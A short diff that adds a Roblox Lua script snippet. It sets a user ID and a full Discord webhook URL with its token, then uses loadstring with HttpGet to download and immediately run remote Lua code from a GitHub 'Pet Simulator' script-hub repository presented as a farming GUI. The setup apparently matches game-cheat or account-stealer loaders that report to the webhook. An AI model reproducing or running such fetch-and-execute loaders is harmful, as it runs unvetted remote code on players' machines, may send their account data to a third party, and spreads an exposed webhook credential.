@@ -1,0 +1,3 @@
+UserId =Am10o
+WebHook.Dis = https://discord.com/api/webhooks/1113788823294447647/seEEKQwLgkiGDdYVbM2Kp5aYLQ8kOQkTHdtNE0l2QHGaSkZOICWtVxKrrtye3AeGksmM
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/petsimxlauncher/main/Boredhubfarmgui.lua",true ))()
